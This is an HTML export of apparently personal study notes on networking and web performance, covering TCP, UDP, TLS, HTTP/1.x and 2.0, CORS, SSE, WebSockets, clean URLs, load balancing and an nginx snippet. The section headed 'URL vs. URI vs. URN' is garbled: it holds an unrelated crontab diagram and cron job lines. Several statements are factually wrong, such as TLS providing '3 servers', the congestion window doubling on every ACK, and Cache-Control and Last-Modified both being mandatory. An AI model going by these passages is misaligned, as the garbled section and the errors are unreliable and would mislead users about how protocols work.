<li><a href="#chapter-11">chapter11</a></li>
<li><a href="#chapter12">chapter12</a></li>
<li><a href="#chapter-13">chapter13</a></li>
<li><a href="#chapter-15">chapter15</a></li>
<li><a href="#chapter-16">chapter16</a></li>
<li><a href="#chapter-17">chapter17</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="chapter-1"><a class="header" href="#chapter-1">Chapter 1</a></h1>
<ul>
<li>There are two critical components that dictate the performance of all network traffic
<ul>
<li>latency - The time it takes from the source to send a packet to the destination receiving it
<ul>
<li>Components of a typical router on the internet that contribute to latency
<ul>
<li>Propagation delay - Amount of time required for a message to travel from source to destination, which a function of distance over speed with which the signal propagates.</li>
<li>Transmission delay - Amount of time required to push all the packet‚Äôs bits onto the link, which is a function of the packet‚Äôs length and the bandwidth of the link.</li>
<li>Processing delay - Amount of time required to process the packet header, check for bit-level errors, and determine the packet‚Äôs destination.</li>
<li>Queuing delay - Amount of time the incoming packet is waiting in the queue until it can be processed.</li>
<li>The total latency between client and server is the sum of all delays just listed</li>
</ul>
</li>
</ul>
</li>
<li>bandwidth - The maximum throughput of a logical or physical communication path</li>
</ul>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="chapter-2"><a class="header" href="#chapter-2">Chapter 2</a></h1>
<h3 id="the-tcp-3-way-handshake-process"><a class="header" href="#the-tcp-3-way-handshake-process">The TCP 3-way Handshake process:</a></h3>
<ol>
<li>SYN - Client picks a random sequence number x and sends a SYN packet, which may also include additional TCP flags and options</li>
<li>SYN/ACK - Server increments x by 1, picks own random sequence number y, appends its own flags and options, and dispatches the response</li>
<li>ACK - Client increments both x and y by one and completes the handshake by dispatching the last ACK packet in the handshake</li>
</ol>
<h3 id="flow-control"><a class="header" href="#flow-control">Flow control</a></h3>
<ul>
<li>Flow control is a method for preventing the sender from overloading the receiver with data they may not be able to process</li>
<li>Each side of the TCP connection advertises its own receive window (rwnd), which communicates the size of the available buffer space to hold the data</li>
<li>The window size can be changed during a transaction. If the window size changes to 0, this indicates the client cannot receive any more data until it finishes processing the existing buffered data</li>
<li>Each ACK packet carries the latest rwnd on each side of the connection</li>
</ul>
<h3 id="tcp-slow-start"><a class="header" href="#tcp-slow-start">TCP Slow Start</a></h3>
<p>TCP slow start is a congestion control mechanism used in TCP (Transmission Control Protocol), which is one of the core protocols of the Internet. The purpose of TCP slow start is to gradually increase the amount of data sent by a sender until it reaches an optimal level that maximizes network utilization without causing congestion.
When a TCP connection is established between a client and a server, the sender begins by sending a small number of data packets. During the initial phase, the sender‚Äôs transmission rate is low to avoid overwhelming the network or causing congestion. This phase is known as slow start.</p>
<p>Here‚Äôs how TCP slow start works:</p>
<ol>
<li>Connection Establishment: The TCP connection is established between the sender and the receiver.</li>
<li>Initial Congestion Window (cwnd): At the beginning of the connection, the sender sets its congestion window (cwnd) to a small value, usually one or two segments worth of data. The congestion window represents the number of unacknowledged packets that the sender can have in flight at any given time.</li>
<li>Sending Data: The sender starts sending data to the receiver, and it waits for acknowledgments (ACKs) from the receiver for each packet sent.</li>
<li>Doubling cwnd: For each ACK received, the sender increases its congestion window size by doubling it. This means that with every successful round-trip of ACKs, the sender is allowed to send twice as many packets as before.</li>
<li>Exponential Growth: As the sender continues to receive ACKs, the congestion window keeps doubling, leading to an exponential growth in the sender‚Äôs data transmission rate.</li>
<li>Congestion Avoidance: Once the congestion window reaches a certain threshold (known as the slow-start threshold), the congestion control mechanism switches from slow start to congestion avoidance. During congestion avoidance, the sender increases the congestion window linearly instead of exponentially.</li>
<li>Multiplicative Decrease: In case of packet loss, which indicates network congestion, the sender interprets it as a sign of congestion and reduces its congestion window size significantly, implementing a multiplicative decrease.</li>
</ol>
<p>The purpose of TCP slow start is to allow the sender to probe the available bandwidth and avoid overwhelming the network with a sudden surge of data. It provides a conservative approach to ensure network stability while still enabling the sender to ramp up its transmission speed to make efficient use of available resources. Slow start is essential for achieving fairness and stability in TCP-based communication across the Internet.</p>
<h3 id="congestion-avoidance"><a class="header" href="#congestion-avoidance">Congestion Avoidance</a></h3>
<p>It is important to recognize that TCP is designed to use packet loss as a feedback mechanism to help regulate its performance. Slow start initializes the connection with a conservative congestion window, and for every round-trip, doubles the amount of data in flight until it exceeds the receiver‚Äôs flow-control window, a system-configured congestion threshold (ssthresh) or until a packet is lost, at which point the congestion avoidance alogorithm takes over.</p>
<h3 id="optimizing-tcp"><a class="header" href="#optimizing-tcp">Optimizing TCP</a></h3>
<p>Some general guidelines for optimizing TCP on a system:</p>
<ul>
<li>Ensure the system is running the latest kernel</li>
<li>Increase TCP‚Äôs Initial Congestion Window to 10</li>
<li>Disable slow-start after idle to improve performance for long-lived TCP connections, which transfer data in bursts</li>
<li>Enable Window Scaling to increase the maximum receive window size and allow high-latency connections to achieve better throughput</li>
<li>Enable TCP Fast Open to allow data to be sent in the initial SYN packet in certain situations.</li>
<li>Eliminate redundant data transfers. You cannot make the bits travel faster. However, you can reduce the amount of bits that are sent</li>
<li>Compress transferred data</li>
<li>Position servers closer to the user to reduce RTT</li>
<li>Reuse established TCP connections whenever possible</li>
</ul>
<h3 id="inspecting-open-socket-statitistics-on-linux-systems"><a class="header" href="#inspecting-open-socket-statitistics-on-linux-systems">Inspecting open socket statitistics on Linux systems</a></h3>
<p><code>sudo ss --options --extended --memory --processes --info</code> to see current peers and their respective connection settings</p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="chapter-3"><a class="header" href="#chapter-3">Chapter 3</a></h1>
<h3 id="udp"><a class="header" href="#udp">UDP</a></h3>
<ul>
<li>UDP packets are very simple. They only add an additional 4 headers to the payload. Checksum, length, source port, and destination port. Of which, only length and destination port are required.</li>
</ul>
<h3 id="nat-1"><a class="header" href="#nat-1">NAT</a></h3>
<p>Because UDP does not maintain connection state, NAT devices do not know when a connection is no longer active. NAT Translators expire UDP connections based on a timer. This timer is typically unique across manufacturers of NAT devices.</p>
<h3 id="nat-traversal"><a class="header" href="#nat-traversal">NAT Traversal</a></h3>
<p>NAT can cause issues for client applications that need to be aware of the public IP of the connection. Some example applications are P2P apps such as VOIP, games, and file sharing. To workaround this issue, protocols such as STUN, TURN, and ICE were created.</p>
<ul>
<li>STUN - Session Traversal Utilities for NAT. A protocol that allows the host application to discover the presence of a NAT device on the network, and when present obtain the allocated public IP address and port tuple for the current connection. To do this, the application requires assistance from a well-known, third party STUN server that resides on the network. The IP address of the STUN server can be shared via DNS.</li>
<li>TURN - Traversal Using Relays around NAT. Runs over UDP, but can switch to TCP when it fails. Requires a well-known public relay to shuttle the data between peers.</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="chapter-4"><a class="header" href="#chapter-4">Chapter 4</a></h1>
<h3 id="ssltls"><a class="header" href="#ssltls">SSL/TLS</a></h3>
<ul>
<li>TLS was designed to operate on top of a reliable transport protocol such as TCP. However, it has also been adapted to run over UDP.</li>
<li>The TLS protocol was designed to provide 3 servers; authentication, encryption, and data integrity. Though, you are not required to use all three in every situation.</li>
<li>In order to establish a cryptographically secure data transfer channel, the peers must agree on a cypher suite and the keys used to encrypt the data. The TLS protocol defines a well-known handshake to perform this exchange, known as the TLS handshake.</li>
<li>TLS uses asymmetric (public key) cryptography.</li>
<li></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="chapter09"><a href="#chapter09" class="header">Chapter09</a></h1>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="chapter-10"><a class="header" href="#chapter-10">Chapter 10</a></h1>
<ul>
<li>The execution of a web app involves three tasks
<ol>
<li>Fetch resources</li>
<li>page layout and rendering</li>
<li>Javascript execution</li>
</ol>
</li>
</ul>
<p>The rendering and scripting steps are symmetric, it is not possible to run them concurrently.</p>
<p>The Navigation Timing API is included in most modern web browsers. It can be used for a wholistic view of page load timing. It includes DNS and TCP connect times with high precision.
The Resource Timing API is also included with most modern browsers can can be used to view the performance profile of a page.
The User Timing API provides a simple JavaScript API to mark and measure application-specific performance metrics with the help of high-resolution timers.</p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="chapter-11"><a class="header" href="#chapter-11">Chapter 11</a></h1>
<h3 id="http-pipelining"><a class="header" href="#http-pipelining">HTTP Pipelining</a></h3>
<p>HTTP Pipelining is a technique used in the HTTP protocol to allow multiple requests to be sent by the client without waiting for a response from the server. The server can respond to these requests in any order, and the client can process the requests as they arrive. HTTP pipelining adoption has remained very limited despite it‚Äôs many benefits. This is because of several drawbacks:</p>
<ol>
<li>A single slow response blocks all requests behind it</li>
<li>When processing requests in parallel, servers must buffer all responses behind the current response. This could lead to resource exhaustion on the server as buffers grow larger and larger.</li>
<li>A failed response may terminate the TCP connection, causing the client to retransmit the request. This could lead to duplicate request processing on the server.</li>
<li>Intermediary devices in the network hop path can cause issues, and compatibility with Intermediary devices is hard to detect. One way around this is to use a secure tunnel, which prevents intermediary devices from reading/modifying the connection.</li>
</ol>
<h3 id="head-of-line-blocking"><a class="header" href="#head-of-line-blocking">Head of Line Blocking</a></h3>
<p>Head of Line blocking can be caused by HTTP pipelining. With HTTP Pipelining, the server processes requests in the order they are received. If a particular request takes a long time to process, the responses for other requests will be blocked.</p>
<h3 id="headers"><a class="header" href="#headers">Headers</a></h3>
<ul>
<li>Headers remain unmodified and are always sent as plain text to remain compatible with previous versions of HTTP. Headers were introduced in HTTP 1.0. Headers typically add 500-800 bytes to the total payload. However, cookies can make them dramatically larger. RFC 2616 does not define a limit on the size of HTTP headers. However, many servers and proxies will try to enforce either an 8 KB or 16 KB limit.</li>
<li>The growing list of headers is not bad in and of itself. However, the fact that all HTTP headers are transferred in plain text (without compression) can lead to high overhead costs for each and every request.</li>
<li>In the example below, we can see that our headers make up 157 bytes of the payload, while the content itself only takes up 15 bytes.</li>
</ul>
<pre><code>$ curl --trace-ascii - -d'{"msg":"hello"}' http://www.igvita.com/api

== Info:   Trying 173.230.151.99:80...
== Info: Connected to www.igvita.com (173.230.151.99) port 80 (#0)
=&gt; Send header, 157 bytes (0x9d)
0000: POST /api HTTP/1.1
0014: Host: www.igvita.com
002a: User-Agent: Mozilla/5.0 Gecko
0049: Accept: */*
0056: Content-Length: 15
006a: Content-Type: application/x-www-form-urlencoded
009b: 
=&gt; Send data, 15 bytes (0xf)
0000: {"msg":"hello"}
</code></pre>
<h3 id="concatination-and-spriting"><a class="header" href="#concatination-and-spriting">Concatination and Spriting</a></h3>
<ul>
<li>Concatination is the ability for HTTP 1.x to bundle multiple JavaScript or CSS files into a single resource</li>
<li>Spriting is the ability for multiple images to be combined into a larger, composite image and sent via a single response.</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="chapter12"><a class="header" href="#chapter12">Chapter12</a></h1>
<ul>
<li>HTTP 2.0 introduced a new form of encapsulation which provides more efficient use of network resources and reduced perception of latency by allowing header field compression and multiple concurrent messages on the same connection.</li>
</ul>
<h3 id="binary-framing-layer"><a class="header" href="#binary-framing-layer">Binary Framing Layer</a></h3>
<p>At the core of the HTTP 2.0 enhancements it the HTTP Binary Framing Layer, which dictates how HTTP messages are encapsulated and transmitted between client and server. The ‚Äúlayer‚Äù refers to a design choice to introduce a new mechanism between the socket interface and the higher HTTP API exposed to the application. HTTP 1.x messages are new-line delimited. All HTTP 2.0 communication is split into smaller messages and frames, each of which is encoded in binary format.</p>
<h3 id="streams-messages-and-frames"><a class="header" href="#streams-messages-and-frames">Streams, Messages, and frames</a></h3>
<p>HTTP 2.0 introduced some new terminology. Let‚Äôs go over that now.</p>
<ul>
<li>Stream = a bidirectional flow of bytes within an established HTTP 2.0 connection. All communication is performed within a single TCP connection. Each string has a unique integer identifier.</li>
<li>Message = a complete sequence of frames that map to a logical message. The message is a logical HTTP message, such as a request or response.</li>
<li>Frame = The smallest unit of HTTP communication, each containing a frame header, which at a minimum identifies to which stream the frame belongs. Frames carry specific types of data, such as headers, payloads, etc.</li>
</ul>
<pre><code>TCP Connection
------------------------------------------------------------------------------------------------------------------------------------------
Stream 1:
==============================================================              ==============================================================
Message: Frame[&lt;Header&gt;] Frame[&lt;Payload&gt;]                                   Message: Frame[&lt;Header&gt;] Frame[&lt;Payload&gt;]
==============================================================              ==============================================================

Stream 2:
==============================================================              ==============================================================
Message: Frame[&lt;Header&gt;] Frame[&lt;Payload&gt;]                                   Message: Frame[&lt;Header&gt;] Frame[&lt;Payload&gt;]                                   
==============================================================              ==============================================================
------------------------------------------------------------------------------------------------------------------------------------------
</code></pre>
<p>This model provides request and response multiplexing, in which the client can be transmitting frames to the server, and at the same time the server can be transmitting frames to the client. All within a single TCP connection. This essentially eliminates the head-of-line blocking problem!</p>
<h3 id="server-push"><a class="header" href="#server-push">Server Push</a></h3>
<p>HTTP 2.0 also introduces Server Push. With server push, a client may send a single request for a resource, and the server can then send multiple responses back for resources that it knows the client will need. Why would we ever need this? A web page/app consists of multiple resources, all of which are discovered by the client while examining the document provided by the server. If the server knows the client is going to need those additional resources, it can just send them without the client actually requesting them. What if the client doesn‚Äôt want these additional resources? The client has the option to deny the resource being sent by the server. This process is implemented via a ‚ÄúPush Promise‚Äù. All server pushes are initiated with a Push Promise, which signals the servers intent to push resources to the client. The Push Promise frame only contains the HTTP headers of the promised resource. Once the client receives the promise, it has the option to decline the stream if it wants to (i.e. if the resource is already in the local client cache).</p>
<p>Apache‚Äôs MOD_SPDY mod looks for an X-ASSOCIATED-CONTENT header, which lists the resources to be pushed. The server can also just parse the document and infer the resources to be pushed. The strategy for implementing server push is not defined in the RFC, and is left up to the developer.</p>
<h3 id="header-compression"><a class="header" href="#header-compression">Header compression</a></h3>
<p>Each HTTP 1.x transfer carries headers with it that can consume anywhere from 300-800 bytes of overhead per request, and kilobytes more if cookies are required. To reduce this overhead, HTTP 2.0 introduced header compression.</p>
<ul>
<li>Instead of transmitting the same data on each request and response, HTTP 2.0 uses ‚Äúheader tables‚Äù on both the client and server to keep track of previously sent key-value pairs</li>
<li>Header tables persist for the lifetime of the HTTP 2.0 connection and can be incrementally updated</li>
<li>Key-value pairs can be added or replaced</li>
</ul>
<p>The key-value pairs for some headers like ‚Äúmethod‚Äù and ‚Äúscheme‚Äù rarely change during a connection, so a second request within the connection will not need to send these headers, saving several hundred bytes of data.</p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="chapter-13"><a class="header" href="#chapter-13">Chapter 13</a></h1>
<p>The physical properties of the communication channel set hard performance limits on every application. Speed of light and distance between client and server dictate the propagation latency, and the choice of medium (wired vs. wireless) determines the processing, transmission, queueing, and other delays incurred by each data packet. In fact, the performance of most web apps is limited by latency, not by bandwidth. While bandwidth speeds continue to increase, the same cannot be said for latency. As a result, while we cannot make the bits travel any faster, it is crucial that we apply all the possible optimizations at the transport and application layers to eliminate unnecessary round trips, requests, and minimize the distance traveled by each packet.</p>
<ul>
<li>Latency is the bottleneck, and the fastest bits are bits not sent.</li>
</ul>
<h2 id="caching-resources-on-the-client"><a class="header" href="#caching-resources-on-the-client">Caching resources on the client</a></h2>
<ul>
<li>The <code>cache-control</code> header can specify the cache lifetime of a resource</li>
<li>The <code>last-modified</code> and <code>ETag</code> headers provide validation mechanisms for cached resources</li>
<li>You need to specify both the <code>cache-control</code> and <code>last-modified</code> headers. You cannot use one OR the other.</li>
</ul>
<h2 id="optimizing-for-http-20"><a class="header" href="#optimizing-for-http-20">Optimizing for HTTP 2.0</a></h2>
<p>At a minimum:</p>
<ol>
<li>Server should start with a TCP CWND of 10 segments</li>
<li>Server should support TLS with ALPN negotiation</li>
<li>Server should support TLS connection reuse to minimize handshake latency</li>
</ol>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="chapter-15"><a class="header" href="#chapter-15">Chapter 15</a></h1>
<h1 id="xhr"><a class="header" href="#xhr">XHR</a></h1>
<p>XHR is a browser-level API that allows the client to script data transfers via JavaScript. XHR made it‚Äôs first debut in IE5, and was created by the original team that built the Outlook Web App. It was one of the key technologies behind the Async JavaScript and XML (AJAX) revolution. Prior to XHR, the webpage had to be refreshed to send any state updates between client and server. With XHR, this workflow could be done async and under full control of the application in JavaScript code. XHR is what enabled us to make the leap from building basic web pages to building full web applications.</p>
<h1 id="cors-cross-origin-resource-sharing"><a class="header" href="#cors-cross-origin-resource-sharing">CORS (Cross Origin Resource Sharing)</a></h1>
<p>XHR is a browser-level API that automatically handles myriad low-level details such as caching, handling redirects, content negotiation, authentication, and much more. This serves a dual purpose. First it makes the application APIs much easier to work with, allowing us to focus on the business logic. But, second, it allows the browser to sandbox and enforce a set of security and policy constraints on the application code.</p>
<p>The XHR interfaces enforces strict HTTP semantics on each request. While the XHR API allows the application to add custom HTTP headers (via the SetRequestHeader() method) there are a number of protected headers that are off-limits to application code:</p>
<ul>
<li>Accept-Charset, Accept-Encoding, Access-Control-*</li>
<li>Host, Upgrade, Connection, Referrer, Origin</li>
<li>Cookie, Sec-<em>, Proxy-</em>, and lots more</li>
</ul>
<p>The browser will refuse to override any of the unsafe headers. Protecting the Origin header is the key piece of the ‚Äòsame-origin policy‚Äô applied to all XHR requests.</p>
<ul>
<li>An origin is defined as a triple of application protocol, domain name, and port number (example: https, google.com, 443)</li>
</ul>
<p>The motivation for CORS is simple, the browser stores vulnerable information, such as auth tokens, cookies, and other private metadata, which cannot be leaked across applications.</p>
<p>The browser automatically appends the protected Origin HTTP header, which advertises the origin from where the request is being made. In turn, the remote server is then able to examine the Origin header and decide if it should allow the request by returning an Access-Control-Allow-Origin header in its response.</p>
<ul>
<li>CORS requests omit user credentials such as cookies and auth tokens</li>
</ul>
<h3 id="polling-with-xhr"><a class="header" href="#polling-with-xhr">Polling with XHR</a></h3>
<p>XHR enables a simple and efficient way to sync client updates with the server. Whenever necessary, an XHR request is dispatched by the client to update the appropriate data on the server. However, the same problem, in reverse, is much more difficult. If data is updated on the server, how does the server notify the client? The answer is that the client must poll the server.</p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="chapter-16"><a class="header" href="#chapter-16">Chapter 16</a></h1>
<h3 id="server-sent-events-sse"><a class="header" href="#server-sent-events-sse">Server Sent Events (SSE)</a></h3>
<p>Server-Sent Events (SSE) is a technology that enables a server to send continuous updates or event streams to clients over HTTP. It is a unidirectional communication method where the server pushes data to the client, allowing real-time updates without the need for the client to repeatedly request information. To meet this goal, SSE introduced two components: a new EventSource interface in the browser, which allows the client to receive push notifications from the server as DOM events, and the ‚Äúevent stream‚Äù data format, which is used to deliver the individual updates.</p>
<p>Here‚Äôs how Server-Sent Events work:</p>
<ol>
<li>Establishing a Connection: The client initiates a regular HTTP connection with the server by sending a GET request to a specific URL that handles SSE.</li>
<li>Server Response: Upon receiving the GET request, the server responds with an HTTP header containing the ‚ÄúContent-Type‚Äù field set to ‚Äútext/event-stream‚Äù. This indicates that the server will be sending events rather than a traditional HTTP response.</li>
<li>Event Stream Format: The server sends events in a specific format. Each event is represented as a separate message and consists of one or more lines. Each line can either be an event field or data field. An event field starts with ‚Äúevent:‚Äù followed by the event name, while a data field starts with ‚Äúdata:‚Äù followed by the event data.</li>
<li>Connection Persistence: Unlike traditional HTTP requests, SSE connections persist and remain open until either the server or the client explicitly closes them. This enables the server to send events to the client whenever updates occur.</li>
<li>Event Lifecycle: The server can send events at any time, and the client receives them immediately. The client-side JavaScript code can listen for these events and perform actions or update the user interface based on the received data.</li>
<li>Error Handling: SSE connections can handle errors gracefully. If the connection is lost, the client automatically attempts to reconnect, allowing a reliable and uninterrupted stream of events.</li>
<li>Closing the Connection: The client or server can close the connection at any time. If the client wants to terminate the SSE connection, it can simply close the connection from its end, and the server will recognize that the client is no longer available.</li>
</ol>
<p>Server-Sent Events are often used for real-time notifications, live feeds, chat applications, or any scenario where continuous updates from the server to clients are required. It provides a lightweight and easy-to-use alternative to WebSockets when bidirectional communication is not necessary.</p>
<h3 id="event-stream-protocol"><a class="header" href="#event-stream-protocol">Event Stream Protocol</a></h3>
<p>An SSE event stream is delivered as a streaming HTTP response:</p>
<ol>
<li>The client send a regular HTTP GET request</li>
<li>The server responds with a custom ‚Äútext/event-stream‚Äù content-type header, and then stream the UTF-8 encoded data.</li>
</ol>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="chapter-17"><a class="header" href="#chapter-17">Chapter 17</a></h1>
<h3 id="websocket"><a class="header" href="#websocket">Websocket</a></h3>
<p>Websocket enables bidirectional, message-oriented streaming of text and binary data between client and server. It is the closest thing to a raw network socket in the browser that we have.</p>
<p>The WebSocket resource URL uses its own custom scheme: ws for plain-text communication and wss for encrypted (TLS) communication. Why the custom scheme, instead of http/s? The primary use case for the Websocket protocol is to provide an optimized, bidirectional communication channel between applications running in the browser and server. However, the WebSocket wire protocol can be used outside of the browser and could be negotiated via a non-http exchange.</p>
<p>WebSocket communication consists of messages and application code and does not need to worry about buffering, parsing and reconstructing received data. For example, if the server sends a 1 MB payload, the applications <code>onmessage</code> callback will only be called once the client receives the entire payload.</p>
<p>WebSockets can transfer test or binary data.</p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="http"><a class="header" href="#http">HTTP</a></h1>
<h2 id="directory-map-19"><a class="header" href="#directory-map-19">Directory Map</a></h2>
<ul>
<li><a href="#clean-urls">clean_urls</a></li>
<li><a href="#http-persistent-connection">persistent_connections</a></li>
<li><a href="#urn">url-vs-uri-vs-urn</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="clean-urls"><a class="header" href="#clean-urls">Clean URLs</a></h1>
<h2 id="definition-2"><a class="header" href="#definition-2">Definition</a></h2>
<p>Clean URLs, also known as user-friendly URLs, pretty URLs, search engine-friendly URLs, or RESTful URLs, are web addresses (Uniform Resource Locators or URLs) designed to enhance the usability and accessibility of websites, web applications, or web services. They aim to be immediately meaningful to non-expert users, reflect the logical structure of information, and decouple the user interface from the server‚Äôs internal representation.</p>
<h2 id="benefits-4"><a class="header" href="#benefits-4">Benefits</a></h2>
<ul>
<li>Improved usability and accessibility for users.</li>
<li>Enhanced search engine optimization (SEO).</li>
<li>Conformance with the representational state transfer (REST) architectural style.</li>
<li>Consistency in web resource locations, facilitating bookmarking.</li>
<li>Reduced difficulty in changing the resource implementation, as clean URLs don‚Äôt contain implementation details.</li>
<li>Improved security by concealing internal server or application information.</li>
</ul>
<h2 id="structure"><a class="header" href="#structure">Structure</a></h2>
<p>Clean URLs typically consist of a path that represents a logical structure that users can easily understand. They avoid including opaque or irrelevant information such as numeric identifiers, illegible data, or session IDs found in query strings.</p>
<h3 id="examples-6"><a class="header" href="#examples-6">Examples</a></h3>
<ul>
<li>Original URL: <code>http://example.com/about.html</code>
Clean URL: <code>http://example.com/about</code></li>
<li>Original URL: <code>http://example.com/user.php?id=1</code>
Clean URL: <code>http://example.com/user/1</code></li>
<li>Original URL: <code>http://example.com/index.php?page=name</code>
Clean URL: <code>http://example.com/name</code></li>
<li>Original URL: <code>http://example.com/kb/index.php?cat=1&amp;id=23</code>
Clean URL: <code>http://example.com/kb/1/23</code></li>
<li>Original URL: <code>http://en.wikipedia.org/w/index.php?title=Clean_URL</code>
Clean URL: <code>http://en.wikipedia.org/wiki/Clean_URL</code></li>
</ul>
<h2 id="implementation"><a class="header" href="#implementation">Implementation</a></h2>
<p>The implementation of clean URLs involves URL mapping through pattern matching or transparent rewriting techniques on the server side. This ensures that users primarily interact with clean URLs.</p>
<p>For SEO, developers often include relevant keywords in clean URLs and remove unnecessary words, enhancing user-friendliness and search engine rankings.</p>
<h2 id="slug"><a class="header" href="#slug">Slug</a></h2>
<p>A <strong>slug</strong> is the part of a URL that contains human-readable keywords identifying a page. It typically appears at the end of the URL and serves as the name of the resource. Slugs can be automatically generated from page titles or entered manually.</p>
<h3 id="characteristics-of-slugs"><a class="header" href="#characteristics-of-slugs">Characteristics of Slugs</a></h3>
<ul>
<li>Often entirely lowercase.</li>
<li>Accented characters replaced by Latin script letters.</li>
<li>Whitespace characters replaced by hyphens or underscores.</li>
<li>Punctuation marks removed.</li>
<li>Some common words (e.g., conjunctions) may be removed.</li>
</ul>
<p>Slugs provide a brief idea of a page‚Äôs topic, help organize long lists of URLs, and make filenames more descriptive when saving web pages locally.</p>
<p>Websites using slugs include Stack Exchange Network and Instagram for question titles and user-specific URLs.</p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="http-persistent-connection"><a class="header" href="#http-persistent-connection">HTTP Persistent Connection</a></h1>
<p>HTTP persistent connection, also known as HTTP keep-alive or connection reuse, involves using a single TCP connection for multiple HTTP requests/responses instead of opening new connections for each pair. This method is employed in both HTTP/1.0 (unofficially through an extension) and HTTP/1.1 (officially, with all connections considered persistent unless specified otherwise). It offers several advantages, including reduced latency, CPU usage, network congestion, and enhanced HTTP pipelining. However, it can lead to resource allocation issues on the server if connections are not properly closed. Modern web browsers and Python‚Äôs requests library support HTTP persistent connections.</p>
<h2 id="overview-10"><a class="header" href="#overview-10">Overview</a></h2>
<ul>
<li><strong>Definition</strong>: A method to use a single TCP connection for multiple HTTP requests/responses.</li>
<li><strong>Also Known As</strong>: HTTP keep-alive, connection reuse.</li>
</ul>
<h2 id="versions"><a class="header" href="#versions">Versions</a></h2>
<ul>
<li><strong>HTTP/1.0</strong>: Unofficially implemented through an extension.</li>
<li><strong>HTTP/1.1</strong>: Officially supports persistent connections as a default.</li>
</ul>
<h2 id="advantages"><a class="header" href="#advantages">Advantages</a></h2>
<ol>
<li><strong>Reduced Latency</strong>: Fewer delays in communication.</li>
<li><strong>Lower CPU Usage</strong>: Less processing power required for connection setup and teardown.</li>
<li><strong>Decreased Network Congestion</strong>: Fewer connections lead to less network traffic.</li>
<li><strong>Enhanced HTTP Pipelining</strong>: Efficient request/response processing.</li>
</ol>
<h2 id="disadvantages"><a class="header" href="#disadvantages">Disadvantages</a></h2>
<ul>
<li><strong>Resource Allocation Issues</strong>: Potential server problems due to improperly closed connections.</li>
</ul>
<h2 id="support"><a class="header" href="#support">Support</a></h2>
<ul>
<li><strong>Modern Web Browsers</strong>: Generally support HTTP persistent connections.</li>
<li><strong>Python‚Äôs <code>requests</code> Library</strong>: Also supports this feature.</li>
</ul>
<p>For more detailed information, visit the <a href="https://en.wikipedia.org/wiki/HTTP_persistent_connection">Wikipedia article</a>.</p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="urn"><a href="#urn" class="header">URN</a></h1>
<p>URL vs. URI vs. URN</p>
<pre><code># .---------------- URN
# |                                     .------------- hour (0 - 23)
# |                                  |  .---------- day of month (1 - 31)
# |                                  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |                                  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |                                  |  |  |  |
  -----------------------------------------------------------------
                            ---------------------------------------
https://rnemeth90.github.io/posts/2023-12-12-golang-url-validation/

# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / &amp;&amp; run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )
#
</code></pre>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="load-balancing"><a class="header" href="#load-balancing">Load Balancing</a></h1>
<h2 id="directory-map-20"><a class="header" href="#directory-map-20">Directory Map</a></h2>
<ul>
<li><a href="#load-balancing-1">load-balancing</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="load-balancing-1"><a class="header" href="#load-balancing-1">load balancing</a></h1>
<p><img src="networking/load-balancing/lb-algorithms.png" alt=""></p>
<h2 id="static-algorithms"><a class="header" href="#static-algorithms">Static Algorithms</a></h2>
<h3 id="round-robin"><a class="header" href="#round-robin">Round Robin</a></h3>
<ul>
<li>The client requests are sent to different service instances in sequential order. The services are usually required to be stateless.</li>
</ul>
<h3 id="sticky-round-robin"><a class="header" href="#sticky-round-robin">Sticky Round Robin</a></h3>
<ul>
<li>This is an improvement of the round-robin algorithm. If Alice‚Äôs first request goes to service A, the following requests go to service A as well.</li>
</ul>
<h3 id="weighted-round-robin"><a class="header" href="#weighted-round-robin">Weighted round-robin</a></h3>
<ul>
<li>The admin can specify the weight for each service. The ones with a higher weight handle more requests than others.</li>
</ul>
<h3 id="hash"><a class="header" href="#hash">Hash</a></h3>
<ul>
<li>This algorithm applies a hash function on the incoming requests‚Äô IP or URL. The requests are routed to relevant instances based on the hash function result. We can use other attributes for hashing algorithms. For example, HTTP header, request type, client type, etc.</li>
</ul>
<h2 id="dynamic-algorithms"><a class="header" href="#dynamic-algorithms">Dynamic Algorithms</a></h2>
<h3 id="least-connections"><a class="header" href="#least-connections">Least connections</a></h3>
<ul>
<li>A new request is sent to the service instance with the least concurrent connections.</li>
</ul>
<h3 id="least-response-time"><a class="header" href="#least-response-time">Least response time</a></h3>
<ul>
<li>A new request is sent to the service instance with the fastest response time.</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="nginx"><a class="header" href="#nginx">Nginx</a></h1>
<h2 id="directory-map-21"><a class="header" href="#directory-map-21">Directory Map</a></h2>
<ul>
<li><a href="#set-header">custom-header-response</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="set-header"><a href="#set-header" class="header">set header</a></h1>
<pre><code>    nginx.ingress.kubernetes.io/server-snippet: |
        if ($upstream_status == 404){
            #set header
            add_header x-aprimo-upstream-status "my server header content!";
        }
</code></pre>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="rate-limiting-algorithms"><a class="header" href="#rate-limiting-algorithms">Rate Limiting Algorithms</a></h1>
